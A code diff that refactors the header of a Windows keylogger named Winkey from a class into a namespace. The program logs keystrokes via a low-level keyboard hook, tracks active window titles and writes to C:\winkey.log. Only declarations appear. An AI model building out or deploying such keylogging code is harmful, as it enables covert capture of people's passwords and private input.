@@ -6,26 +6,25 @@
 
 #define LOG_FILE TEXT("C:\\winkey.log")
 
-HANDLE	gLogHandle;
-TCHAR	gLastWindowTitle[512] = {0};
-BOOL	gReportNextWindow = false;
+namespace Winkey {
+	HANDLE	gLogHandle;
+	TCHAR	gLastWindowTitle[512] = { 0 };
+	BOOL	gReportNextWindow = false;
 
-class Winkey {
-public:
-	Winkey();
-	~Winkey();
+	int Construct();
+	void Destroy();
 
 	int Hook();
-	static LRESULT CALLBACK onKey(int nCode,
+	LRESULT CALLBACK onKey(int nCode,
 		WPARAM wParam,
 		LPARAM lParam);
-	static LRESULT CALLBACK onWindow(HWINEVENTHOOK hWinEventHook,
+	LRESULT CALLBACK onWindow(HWINEVENTHOOK hWinEventHook,
 		DWORD event,
 		HWND hwnd,
 		LONG idObject,
 		LONG idChild,
 		DWORD idEventThread,
 		DWORD dwmsEventTime);
-	static std::string solve(KBDLLHOOKSTRUCT *kbdEv);
-	static void logCurrentWindow();
+	std::string solve(KBDLLHOOKSTRUCT *kbdEv);
+	void logCurrentWindow();
 };
